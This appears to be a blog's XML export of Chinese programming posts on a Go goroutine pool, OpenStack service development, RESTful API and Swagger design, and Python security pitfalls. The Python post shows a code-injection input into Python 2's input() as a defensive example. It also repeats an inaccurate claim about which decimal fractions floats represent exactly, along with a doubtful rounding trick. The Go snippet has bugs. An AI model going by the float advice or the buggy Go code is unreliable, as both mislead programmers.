MaxQueue is the job Queue buffered lenth MaxQueue = os.Getenv("MAX_QUEUE") // JobQueue is a buffered channel that we can send work requests on. JobQueue chan Job // WorkerPool is a pool of workers that are instantianted to perform the work WorkerPool chan chan Job)// Job represents the job to be runtype Job struct &#123; ID int task func()&#125;// Worker represents the worker that executes the jobtype Worker struct &#123; ID int InputQueue chan Job OutputQueue chan Result QuitQueue chan bool WorkerPool chan chan Job&#125;// Result use to collect the task resulttype Result struct &#123; JobID int Data interface&#123;&#125; Err error&#125;// GoroutinePool is a pool of workers channels that are registered with the GoroutinePooltype GoroutinePool struct &#123; maxWorkers int maxQueue int JobQueue chan Job ResultQueue chan Result WorkerPool chan chan Job&#125;// NewWorker is factory function to new a workerfunc NewWorker(id int, workerPool chan chan Job) *Worker &#123; worker := Worker&#123; ID: id, InputQueue: make(chan Job), OutputQueue: make(chan Result), WorkerPool: workerPool, QuitQueue: make(chan bool), &#125; return &amp;worker&#125;// Start method starts the run loop for the worker, listening for a quit channel// in case we need to stop itfunc (w Worker) Start() &#123; go func() &#123; for &#123; // register the current worker into the worker queue. w.WorkerPool &lt;- w.InputQueue select &#123; // we have received a work request case job := &lt;-w.InputQueue: job.task() // we have received a signal to stop case &lt;-w.QuitQueue: return &#125; &#125; &#125;()&#125;// Stop signals the worker to stop listening for work requests.func (w Worker) Stop() &#123; go func() &#123; w.QuitQueue &lt;- true &#125;()&#125;// NewGoroutinePool is a factory function to new a GoroutinePoolfunc NewGoroutinePool(maxWorkers int, maxQueue int) *GoroutinePool &#123; return &amp;GoroutinePool&#123; WorkerPool: make(chan chan Job, maxWorkers), JobQueue: make(chan Job, maxQueue), ResultQueue: make(chan Result, maxQueue), maxWorkers: maxWorkers, maxQueue: maxQueue, &#125;&#125;// dispatch use to dispatch the jobfunc (d *GoroutinePool) dispatch() &#123; for &#123; select &#123; case job := &lt;-d.JobQueue: // a job request has benn received go func(job Job) &#123; // try to obtain a worker job channel that is available. // this will block until a worker is idle jobChan := &lt;-d.WorkerPool // dispatch the job to the worker jobChan jobChan &lt;- job &#125;(job) &#125; &#125;&#125;// Run use to starting n number os workersfunc (d *GoroutinePool) Run() &#123; for i := 0; i &lt; d.maxWorkers; i++ &#123; worker := NewWorker(i+1, d.WorkerPool) worker.Start() &#125; go d.dispatch()&#125;// AddJob is a method to add job to job channelfunc (d *GoroutinePool) AddJob(job Job) (msg string, err error) &#123; JobQueue &lt;- job return "add a job to Job queue", nil&#125; 测试]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>goroutine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何开发Openstack服务-开篇(一)]]></title>
    <url>%2F2017%2F01%2F10%2Fdevelop-openstack-service%2F</url>
    <content type="text"><![CDATA[openstack是我见过最大最复杂的python项目, 虽然openstack项目的热度在下滑, 但是openstack这套开发理念任然是相当不错的，值得我们学习. 由于工作需要, 我也需要开发一些自定义的openstack服务, 因此想将开发openstack服务的过程以一系列的文章记录下来, 方便需要的人。 openstack简介openstack是一个IaaS平台, 提供计算服务、网络服务、存储服务等, 有3种方式使用openstack提供的服务 API通过API使用OpenStack的方式是由各个服务自己实现的, 这些API都是有统一的形式的，都是采用了HTTP协议实现的符合REST规范的API。 CLI/SDK通过命令行是用OpenStack服务的方式是由一系列项目来提供的，这些项目一般都命名为python-projectclient，比如python-keystoneclient，python-novaclietn等。这些命令行项目分别对应到各个主要的服务，为用户提供命令行操作界面和Python的SDK。比如python-keystoneclient对应到keystone，为用户提供了keystone这个命令，同时也提供了keyston项目的SDK（其实是在SDK的基础上实现了命令行）。这些client项目提供的SDK其实也是封装了对各自服务的API的调用。由于每个主要项目都有一个自己的命令行工具，社区觉得不好，于是又有了一个新的项目python-openstackclient，用来提供一个统一的命令行工具openstack（命令的名字就叫做openstack），这个工具实现了命令行，然后使用各个服务的client项目提供的SDK来完成对应的操作 WebUI通过Web界面使用OpenStack服务这种方式是通过OpenStack的Horizon项目提供的。Horizon项目是一个Django应用，实现了一个面板功能，是传统的MVC开发模型, 不过最新的项目 在慢慢往Angular上迁移。Horizon项目主要是提供一种交互界面，它会通过API来和各个OpenStack服务进行交互，然后在Web界面上展示各个服务的状态；它也会接收用户的操作，然后调用各个服务的API来完成用户对各个服务的使用 因此开发一个完整的openstack项目需要完成上面介绍的3部分的开发，当然API服务是根本。 openstack架构整个openstack的服务是以插件化得方式进行独立开发, 然后通过API相互关联, 比如:接下来我们会以demo的形式开发一个和openstack服务类似的服务，该服务的名称就叫demo openstack中的api服务openstack的API设计风格为RESTful, 如何设计RESTful API我在前面的博客中有介绍, Python的Web开发框架很多，基本上，还活跃的框架都支持RESTful API的开发, 有些框架还专门为RESTful API的开发提供了便利的功能,比如Pecan，有些框架则通过第三方模块来提供这种便利，比如Django和Flask都有不少和REST相关的第三方库。对于框架选择，也没有什么特别好的标准，一般都是比较性能、文档、社区是否活跃等。在我看来，选择流行的一般就不会错下面是openstack keystone关于credential的API: 早期项目的api服务OpenStack项目倾向于不重新发明轮子，一般都会选择现有的库和框架来使用，除非现有的框架不满足需求。因为Web框架的选择很多，而且都满足需求，所以OpenStack项目到目前为止都是使用现成的Web框架。OpenStack早期的项目并没有使用一个框架，而是使用了几个不同的模块来组合出一个框架：Paste + PasteDeploy + Routes + WebOb，这几个不同的模块分别负责应用的WSGI化、URL路由和请求处理等功能。Nova, Glance, Neutron, Keystone等早期的项目都是使用这样的架构来实现RESTful API的。早期的这种技术选型带来的好处是”框架”具备足够的灵活性，缺点则是要把这几个模块组合起来实现一个REST服务，需要写很多代码，连WSGI的入口函数都要自己实现（比如Keystone项目的keystone/common/wsgi.py文件中的class Application）。因为灵活性的好处不是很明显，而代码量大的坏处很明显，比如上面那个class Application需要在每个项目中复制一遍，所以社区的新项目就开始使用新的Web框架Pecan 新项目的api服务Pecan是一个基于对象路由的框架，即灵活又简单。Pecan主要实现了URL路由功能，支持RESTful API。Pecan没有实现模板、session管理和ORM等功能，但是这些功能可以通过其他的模块来实现。对于OpenStack来说，Pecan是一个很好的选择，因为OpenStack项目中统一使用sqlalchemy来实现ORM，API的实现也不需要模板功能，安全控制则基于Keystone体系。使用Pecan来开发REST服务，代码量很少，代码结构也清晰。Ceilometer项目就是使用了Pecan]]></content>
      <categories>
        <category>开发语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>openstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESTful API 设计规范]]></title>
    <url>%2F2017%2F01%2F06%2Frest-api-design%2F</url>
    <content type="text"><![CDATA[做出一个好的API设计很难。API表达的是你的数据和你的数据使用者之间的契约，因此API的设计往往是站在使用者的角度进行的，而关于RESTful的介绍可以参考阮一峰的博客理解RESTful架构 , 这里同时也参考了他的另一篇博客RESTful API 设计指南在这方面有一篇很出名的文章，这里需要你自己解决翻墙问题Principles of good RESTful API Design 定义 这里有一些非常重要的术语，我将在本文里面一直用到它们 资源(Resource)：一个对象的单独实例，如一只动物 集合(Collection)：一群同种对象，如动物 HTTP：跨网络的通信协议 客户端(Consumer)：可以创建HTTP请求的客户端应用程序 第三方开发者(Third Party Developer)：这个开发者不属于你的项目但是有想使用你的数据 服务器(Server)：一个HTTP服务器或者应用程序，客户端可以跨网络访问它 端点(Endpoint)：这个API在服务器上的URL用于表达一个资源或者一个集合 幂等(Idempotent)：无边际效应，多次操作得到相同的结果 URL段(Segment)：在URL里面已斜杠分隔的内容 数据设计与抽象 理清业务数据流程 规划好你的API的外观要先于开发它实际的功能。首先你要知道数据该如何设计和核心服务/应用程序会如何工作, 这部分的工作 往往就是需要写好 PRD和DRD这些功能文档 站在使用者的角度进行合理抽象 有时候一个集合可以表达一个数据库表，而一个资源可以表达成里面的一行记录，但是这并不是常态。事实上，你的API应该尽可能 通过抽象来分离数据与业务逻辑。这点非常重要，只有这样做你才不会打击到那些拥有复杂业务的第三方开发者， 否则他们是不会使用你的API的。 如何开放API 当然你的服务可能很多部分是不应该通过API暴露出去的。比较常见的例子就是很多API是不允许第三方来创建用户的。 HTTP 动词一个好的RESTful API只允许第三方调用者使用这四个半HTTP动词进行数据交互，并且在URL段里面不出现任何其他的动词。一般来说，GET请求可以被浏览器缓存（通常也是这样的）。例如，缓存请求头用于第二次用户的POST请求。HEAD请求是基于一个无响应体的GET请求，并且也可以被缓存的。 GET (选择)：从服务器上获取一个具体的资源或者一个资源列表。 POST （创建）： 在服务器上创建一个新的资源。 PUT （更新）：以整体的方式更新服务器上的一个资源。 PATCH （更新）：只更新服务器上一个资源的一个属性。 DELETE （删除）：删除服务器上的一个资源。 HEAD ： 获取一个资源的元数据，如数据的哈希值或最后的更新时间。 OPTIONS：获取客户端能对资源做什么操作的信息。 域名 域名是用于访问你的API服务的第一步，因此如何在域名上表现自己提供的API 服务喃，以下有2种方法 应该尽量将API部署在专用域名之下。 如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。 12https://api.example.com # 专业域名https://example.org/api/ # URI中明确说明 版本化 API是服务器与客户端之间的一个公共契约。如果你对服务器上的API做了一个更改，并且这些更改无法向后兼容， 那么你就打破了这个契约，客户端又会要求你重新支持它。为了避免这样的事情，你既要确保应用程序逐步的演变， 又要让客户端满意。那么你必须在引入新版本API的同时保持旧版本API仍然可用。 随着时间的推移，你可能声明不再支持某些旧版本的API。申明不支持一个特性并不意味着关闭或者破坏它。 而是告诉客户端旧版本的API将在某个特定的时间被删除，并且建议他们使用新版本的API。 如果你只是简单的增加一个新的特性到API上，如资源上的一个新属性或者增加一个新的端点，你不需要增加API的版本。 因为这些并不会造成向后兼容性的问题，你只需要修改文档即可。 这里实现方式有2种： 应该将API的版本号放入URL 将版本号放在HTTP头信息中，但不如放入URL方便和直观, Github采用的就是这种做法 1234567891011121314151617181920https://api.example.com/v1/ # 在URL中说明curl -i https://api.github.com/users/octocat/orgs # HTTP头中表示API版本 HTTP/1.1 200 OK Server: nginx Date: Fri, 12 Oct 2012 23:33:14 GMT Content-Type: application/json; charset=utf-8 Connection: keep-alive Status: 200 OK ETag: &quot;a00049ba79152d03380c34652f2cb612&quot; X-GitHub-Media-Type: github.v3 X-RateLimit-Limit: 5000 X-RateLimit-Remaining: 4987 X-RateLimit-Reset: 1350085394 Content-Length: 5 Cache-Control: max-age=0, private, must-revalidate X-Content-Type-Options: nosniff API ROOT URI API的根地址很重要。可以通过这个列表快速了解你提供的服务，因此，让你的API根入口点保持尽可能的简单。以github的列 123456789101112131415161718192021222324252627282930313233maojun@maojun-mbp# curl https://api.github.com&#123; &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;, &quot;current_user_authorizations_html_url&quot;: &quot;https://github.com/settings/connections/applications&#123;/client_id&#125;&quot;, &quot;authorizations_url&quot;: &quot;https://api.github.com/authorizations&quot;, &quot;code_search_url&quot;: &quot;https://api.github.com/search/code?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;emails_url&quot;: &quot;https://api.github.com/user/emails&quot;, &quot;emojis_url&quot;: &quot;https://api.github.com/emojis&quot;, &quot;events_url&quot;: &quot;https://api.github.com/events&quot;, &quot;feeds_url&quot;: &quot;https://api.github.com/feeds&quot;, &quot;followers_url&quot;: &quot;https://api.github.com/user/followers&quot;, &quot;following_url&quot;: &quot;https://api.github.com/user/following&#123;/target&#125;&quot;, &quot;gists_url&quot;: &quot;https://api.github.com/gists&#123;/gist_id&#125;&quot;, &quot;hub_url&quot;: &quot;https://api.github.com/hub&quot;, &quot;issue_search_url&quot;: &quot;https://api.github.com/search/issues?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;issues_url&quot;: &quot;https://api.github.com/issues&quot;, &quot;keys_url&quot;: &quot;https://api.github.com/user/keys&quot;, &quot;notifications_url&quot;: &quot;https://api.github.com/notifications&quot;, &quot;organization_repositories_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;organization_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;&quot;, &quot;public_gists_url&quot;: &quot;https://api.github.com/gists/public&quot;, &quot;rate_limit_url&quot;: &quot;https://api.github.com/rate_limit&quot;, &quot;repository_url&quot;: &quot;https://api.github.com/repos/&#123;owner&#125;/&#123;repo&#125;&quot;, &quot;repository_search_url&quot;: &quot;https://api.github.com/search/repositories?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;current_user_repositories_url&quot;: &quot;https://api.github.com/user/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;starred_url&quot;: &quot;https://api.github.com/user/starred&#123;/owner&#125;&#123;/repo&#125;&quot;, &quot;starred_gists_url&quot;: &quot;https://api.github.com/gists/starred&quot;, &quot;team_url&quot;: &quot;https://api.github.com/teams&quot;, &quot;user_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;&quot;, &quot;user_organizations_url&quot;: &quot;https://api.github.com/user/orgs&quot;, &quot;user_repositories_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;user_search_url&quot;: &quot;https://api.github.com/search/users?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;&#125; Endpoints 一个端点就是指向特定资源或资源集合的URL。针对每一个端点来说，你可能想列出所有可行的HTTP动词和端点的组合。 在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词， 而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的 “集合”（collection），所以API中的名词也应该使用复数。 请注意如何展示数据之间的关系，特别是雇员与动物园之间的多对多关系。通过添加一个额外的URL段就可以实现更多的交互能力。 当然没有一个HTTP动词能表示正在解雇一个人，但是你可以使用DELETE一个动物园里的雇员来达到相同的效果。 1234567891011121314151617https://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/animal_typeshttps://api.example.com/v1/employeesGET /zoos: List all Zoos (ID and Name, not too much detail)POST /zoos: Create a new ZooGET /zoos/ZID: Retrieve an entire Zoo objectPUT /zoos/ZID: Update a Zoo (entire object)PATCH /zoos/ZID: Update a Zoo (partial object)DELETE /zoos/ZID: Delete a ZooGET /zoos/ZID/animals: Retrieve a listing of Animals (ID and Name).GET /animals: List all Animals (ID and Name).POST /animals: Create a new AnimalGET /animals/AID: Retrieve an Animal objectPUT /animals/AID: Update an Animal (entire object)PATCH /animals/AID: Update an Animal (partial object) 过滤和排序 使用过滤和排序有多种原因，因此API应该提供参数，过滤和排序返回结果，降低客户端的复杂度。 如果记录数量很多，服务器不可能都将它们返回给用户。 从客户端的角度来说，最小化网络传输，并让客户端尽可能快的得到查询结果。 从服务器角度来说，响应请求越小负载就越小。 1234?limit=10: 减少返回给客户端的结果数量（用于分页）?offset=10: 发送一堆信息给客户端（用于分页）?animal_type_id=1: 使用条件匹配来过滤记录?sortby=name&amp;order=asc: 对结果按特定属性进行排序 状态码 服务器向用户返回的状态码和提示信息，因为它们是HTTP的标准，所以通用性上有保证， 状态码的完整定义请看HTTP1.1/rfc Status Code define 1234567891011121314151617181920状态码范围说明：1xx：保留给底层HTTP功能使用的，并且估计在你的职业生涯里面也用不着手动发送这样一个状态码出来。2xx：保留给成功消息使用的，你尽可能的确保服务器总发送这些状态码给用户。3xx：保留给重定向用的。大多数的API不会太常使用这类状态码，但是在新的超媒体样式的API中会使用更多一些。4xx：保留给客户端错误用的。例如，客户端提供了一些错误的数据或请求了不存在的内容。这些请求应该是幂等的，不会改变任何服务器的状态。5xx：保留给服务器端错误用的。这些错误常常是从底层的函数抛出来的，并且开发人员也通常没法处理。发送这类状态码的目的是确保客户端能得到一些响应。收到5xx响应后，客户端没办法知道服务器端的状态，所以这类状态码是要尽可能的避免。常见的一些状态码：200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）204 NO CONTENT - [DELETE]：用户删除数据成功。400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。 错误处理如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。 123&#123; error: "Invalid API key"&#125; 返回结果 针对不同操作，服务器向用户返回的结果应该符合以下规范。 123456GET /collection: 返回一系列资源对象GET /collection/resource: 返回单独的资源对象POST /collection: 返回新创建的资源对象PUT /collection/resource: 返回完整的资源对象PATCH /collection/resource: 返回完整的资源对象DELETE /collection/resource: 返回一个空文档 Hypermedia API RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么 Hypermedia API的设计被称为HATEOAS link: 用户读取这个属性就知道下一步该调用什么API了 rel: rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址） href: API的绝对路径 title: API的标题,用于概述用途 type: API 响应的数据类型 123456&#123;&quot;link&quot;: &#123; &quot;rel&quot;: &quot;collection https://www.example.com/zoos&quot;, &quot;href&quot;: &quot;https://api.example.com/zoos&quot;, &quot;title&quot;: &quot;List of zoos&quot;, &quot;type&quot;: &quot;application/vnd.yourformat+json&quot;&#125;&#125; 12345 maojun@maojun-mbp#curl https://api.github.com/user&#123; &quot;message&quot;: &quot;Requires authentication&quot;, &quot;documentation_url&quot;: &quot;https://developer.github.com/v3&quot;&#125; 认证 认证和授权的用户模型该尽量采用RBAC模型，因为其良好的扩容性。 API认证的手段最好采用OAuth2.0, 简单的可以采用 JWT（Json Web Token） 关于OAuth的简介可以参考阮一峰OAuth2.0简介 关于JWT参考此文JWT使用 内容类型 XML已是过去时了，现代的web统一使用JSON，也就是HTTP头种的Content Type标签采用 application/json 1234567891011121314151617181920212223242526请求报文POST /v1/animal HTTP/1.1Host: api.example.orgAccept: application/jsonContent-Type: application/jsonContent-Length: 24 &#123; &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;响应报文HTTP/1.1 200 OKDate: Wed, 18 Dec 2013 06:08:22 GMTContent-Type: application/jsonAccess-Control-Max-Age: 1728000Cache-Control: no-cache &#123; &quot;id&quot;: 12, &quot;created&quot;: 1386363036, &quot;modified&quot;: 1386363036, &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;]]></content>
      <categories>
        <category>程序设计</category>
        <category>RESTful API</category>
      </categories>
      <tags>
        <tag>restful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何使用swagger设计出漂亮的RESTful API]]></title>
    <url>%2F2017%2F01%2F05%2Fapi-design-swagger%2F</url>
    <content type="text"><![CDATA[按照现在的趋势，前后端分离几乎已经是业界对开发和部署方式所达成的一种共识, 后台只负责数据的提供和计算，而完全不处理展现。而前端则负责拿到数据，组织数据并展现的工作。这样结构清晰，关注点分离，前后端会变得相对独立并松耦合。而前段和后端对待的契约就是API设计文档, 有了API的设计文档过后, 后端依据设计文件开发后端程序, 前段根据API设计文档模拟服务器,开发前段页面。而Swagger就是其中一种比较优秀的 RESTful API设计工具。 swagger 工具简介swagger是一个RESTful API 的设计工具，官方提供3种工具： swagger-editor 在线编辑器，同时提供编辑-展现-客户端-服务端代码的生成 swagger-ui 展示工具，将编辑器定义好的json描述文件友好展示的工具。 swagger-codegen 生成服务端和客户端的代码。 因为swagger-editor集成了swagger-codegen功能，因此我们仅需要使用swagger-editor和swagger-ui就够了。 编辑器(editor)可以使用在线编辑器，而由于网络原因, 往往不能很好的使用swagger提供的在线编辑器，然而这个在线编辑器也可以本地部署，其次有很多编辑器也有swagger的插件, 通过按照swagger插件，我们也可以配置出一个swagger的编辑器。有了编辑器后，我们需要熟悉使用swagger来设计API的一些语法。 部署本地编辑器安装docker，配置镜像加速，然后拉去镜像到本地运行12docker pull swaggerapi/swagger-editordocker run -p 80:8080 swaggerapi/swagger-editor 使用本地编辑器推荐使用vscode作为编辑器, 安装vscode的Swagger View插件 就可以打造一个 swagger的编辑器了采用yaml编写，然后使用Swagger Preview 查看预览。 swagger2.0语法详情参考swagger2.0官方规范 格式采用json， 因为yaml是json的一个超集，因此也可以使用。通常情况我们通过yaml来完成编辑，最后通过编辑器导出为json文件。 文件结构为一个单独的文件，但是其中definitions部分可以被抽出来为一个独立文件，通过$ref进行引用，按照惯例，这个文件应该被命名为 swagger.json 数据类型用于描述一个数据的数据类型，对象定义时使用。 Common Name type format Comments integer integer int32 signed 32 bits long integer int64 signed 64 bits float number float double number double string string byte string byte base64 encoded characters binary string binary any sequence of octets boolean boolean date string date As defined by full-date - RFC3339 dateTime string date-time As defined by date-time - RFC3339 password string password Used to hint UIs the input needs to be obscured. 规范规范也就是语法，会安装此规范来编写API设计文档。以下列出了所有需要的关键字段 字段名 类型 描述 swagger string 必填项。表示使用的swagger的版本，必须为2.0 info Info Object 必填项。提供API的一些元数据描述 host string 提供该API服务的主机名称或者IP，测试时 使用该地址进程测试。 basePath string API的基本路径,这是相对的host。 如果不包括,API是直属host。 必须以”/“开头 schemes [string] API的传输协议的列表。 在”http”,”https”,”ws”,”wss”其中选择 consumes [string] 一个MIME类型的api可以使用列表。 值必须是所描述的Mime类型 produces [string] MIME类型的api可以产生的列表。 值必须是所描述的Mime类型 paths 路径对象 必填项。可用的路径和操作的API definitions 定义对象 一个对象数据类型定义 parameters 参数定义对象 定义请求参数的对象 responses 反应定义对象 定义请求响应对象 securityDefinitions 安全定义对象 安全方案定义规范,比如认证 security 安全需求对象 这里主要指使用哪种认证手段 tags 标签对象 没个RESTful中资源的标签，列表中的每个标记名称必须是唯一的 externalDocs 外部文档对象 额外的外部文档, 指向外部url 渲染器(ui)swagger-ui的使用很简单swager-ui官方文档 HTML文档渲染渲染器使用官方的swagger-ui，这里我们需要一个web服务器，用来渲染我们刚才编辑完成的api 设计文档。这里一般使用node 的 express为web框架来做这个简单的web服务器 PDF文档渲染将API设计文档渲染成PDF, 流程是这样: swagger.yaml —&gt; asciiDoc—&gt; pdf 使用swagger2markup来生成asciiDoc格式的文档下载swagger2markup工具,下载地址,选择你想要的版本下载使用工具生成asciiDoc, -i指定swagger.yaml的位置, -f指定输出文件名称： 1java -jar swagger2markup-cli-1.1.0.jar convert -i ~/PycharmProjects/doc/api_design/swagger.yaml -f asiidoc/swagger 使用asciidoctor来将asciiDoc换换成PDF这是一个ruby写的工具，我本地不打算部署ruby环境，因此在找一个docker镜像：madduci/docker-asciidoctor-pdf由于访问dockerhub的镜像速度非常慢，因此我将该工具的使用说明复制了下来，镜像使用说明 Docker Image exposing asciidoctor-pdf as entrypoint and /document as mounted volume where to build the fileTo build your own documents as PDF, simply run the container as:docker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf /document/your_document.adocIf you want to use some custom styles, just run it asdocker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf -a pdf-stylesdir=/document/resources/themes -a pdf-style=your_style -a pdf-fontsdir=/document/resources/fonts /document/your_document.adocand it will generate the pdf in the mounted volume /document 这工具在生成含有中文的pdf文档时有字体问题，因此我修改了字体为微软雅黑字体，以下是修改方法： 添加雅黑字体到当前的Fonts文件夹下面,这里需要标准字体和粗体, 而默认提供的字体只有这些默认提供的字体 1234➜ asiidoc ls Fonts |grep -i &apos;yahei&apos;Microsoft Yahei.ttfyahei.ttfyahei_bold.ttf 修改主题配置default-theme.yml的Noto Serif字段，使用该字体:配置文件下载地址默认配置文件下载地址 12345Noto Serif:normal: yahei.ttfbold: yahei_bold.ttfitalic: yahei.ttfbold_italic: yahei_bold.tt 最后把我们生成好的swagger.adoc, 主题配置文件,字体 放在一个目录下，挂载到docker里面去: 123➜ Downloads ls asiidocFonts swagger.adoc themesdocker run --rm -v $(pwd)/asiidoc/:/document/ madduci/docker-asciidoctor-pdf -a pdf-fontsdir=/document/Fonts -a pdf-stylesdir=/document/themes /document/swagger.adoc 最后查看asiidoc下面就会有生成的pdf文件 代码生成器(codegen)swagger能提供服务端和客户端的代码生成功能,这个功能在swagger-editor上已经集成生成server端代码：生成客户端代码：]]></content>
      <categories>
        <category>程序设计</category>
        <category>RESTful API</category>
      </categories>
      <tags>
        <tag>swagger</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Python中的一些安全建议]]></title>
    <url>%2F2017%2F01%2F02%2Fpython-bestpractice%2F</url>
    <content type="text"><![CDATA[由于Python简洁，优雅，开发效率高，渐渐在计算环境中无处不在。但是如果你不注意，容易编写出具有严重安全隐患的代码, 以下我整理的一些如何编写出安全代码的一些建议。 input函数在Python 2大量的内置功能集合中，input完全就是一个安全灾难。一旦调用它，从标准输入读入的任何东西都会被立即解析为Python代码：12345678910➜ ~ python2Python 2.7.12 (default, Dec 2 2016, 21:51:52)[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)] on darwinType "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; input()dir()['__builtins__', '__doc__', '__name__', '__package__']&gt;&gt;&gt; input()__import__('sys').exit()➜ ~ 显然，必须永远不使用input函数，除非脚本的标准输入中的数据是完全可信的。 Python 2文档建议将raw_input作为一个安全的替代品。在Python 3中，input函数等同于raw_input，从而一劳永逸地解决了这个隐患 assert语句在 Python 应用中使用 assert 语句在不可能条件下捕获是一个编程习惯。123def verify_credentials(username, password): assert username and password, 'Credentials not supplied by caller' ... authenticate possibly null user with null password ... 然而，在将源代码编译成优化的字节码时（例如， python - O ），Python 并不为 assert 语句生成任何指令。它默默地删除那些程序员写的让程序免受畸形数据攻击的代码，让应用暴露在攻击之中。该漏洞的根本原因在于 assert机制纯粹是为测试目的而设，正如在 C++ 中做的那样。程序员必须使用其他手段以保证数据一致性。 不要使用is来比较int在我们的印象里，int是不可变对象，我们来看看下面这个例子12345678910&gt;&gt;&gt; a = 257&gt;&gt;&gt; b = 257&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a == bTrue&gt;&gt;&gt; a = 256&gt;&gt;&gt; b = 256&gt;&gt;&gt; a is bTrue 为了避免每次给经常使用到这部分整数分配一个新的内存，Python预先生成并缓存好这些常用整数([-5, 257))，这样的预处理可以加快程序运行时效率，更详细的了解会在以后的Python数据结构源码解读部分做介绍。因此不要使用is比较整数大小，is是用于比较是否为同一对象的，is本身是不是用来干这件事的。 float的舍入问题因为十进制的小数并不能用二进制精确的表达出来, 在十进制中，进制的基数是10，而5正好是10的一半。 2的一半是多少？当然是1了。 所以，十进制的0.5就是二进制的0.1, 而对于二进制来说，只有0和1的变化，那么只有0.1和0.0,这样仅能精确表达十进制0.0和0.5,你以此类推，那么会发现一个结论：如果一个十进制数可以用二进制精确表示，那么它的最后一位肯定是5,所以只有以5结尾的小数才能被精确的计算我们看看下面一个有趣的现象。1234567891011121314151617181920212223242526In [1]: 0.1 + 0.1Out[1]: 0.2In [2]: 0.1 + 0.1 + 0.1Out[2]: 0.30000000000000004In [3]: 0.1 + 0.1 + 0.1 + 0.1Out[3]: 0.4In [4]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[4]: 0.5In [5]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[5]: 0.6In [6]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[6]: 0.7In [7]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[7]: 0.7999999999999999In [8]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[8]: 0.8999999999999999In [9]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[9]: 0.9999999999999999 我看到有位网友的提出的解决方案： 我有一个观点，针对小数精度不够的问题（例如 0.1），软件可以人为的在数据最后一位补 5， 也就是 0.15，这样牺牲一位，但是可以保证数据精度，还原再把那个尾巴 5 去掉。1234567891011In [40]: 0.4 + 0.2Out[40]: 0.6000000000000001In [41]: (0.45 + 0.25) - (0.05 + 0.05)Out[41]: 0.In [49]: 0.6 + 0.3Out[49]: 0.8999999999999999In [50]: 0.65 + 0.35 - (0.05 + 0.05)Out[50]: 0.9 最好的处理措施是只要有可能，就坚持整数运算。次好的处理措施可能是使用decimal模块，它试图保护用户免受琐碎细节和危险缺陷之苦。 私有属性Python 不支持对象属性隐藏, 及时你使用__来保护你的变量(private),在内部，python也仅仅是将其别名了而已，而这个别名的动作是在解释器调用type来创建class时执行的的。123456789101112131415161718192021222324252627In [54]: class X(object): ...: def __init__(self): ...: self.__private = 1 ...: def get_private(self): ...: return self.__private ...: def has_private(self): ...: return hasattr(self, '__private') ...:In [55]: x = X()In [56]: x.has_private()Out[56]: FalseIn [57]: x.get_private()Out[57]: 1In [58]: x.__private = 2In [59]: x.__privateOut[59]: 2In [60]: hasattr(x, '__private')Out[60]: TrueIn [61]: x._X__privateOut[61]: 1 然后如果我们后面动态添加的属性，那么是不会有这种保护的(无转换发生)12345In [62]: x.__privateOut[62]: 2In [63]: hasattr(x, '__private')Out[63]: True 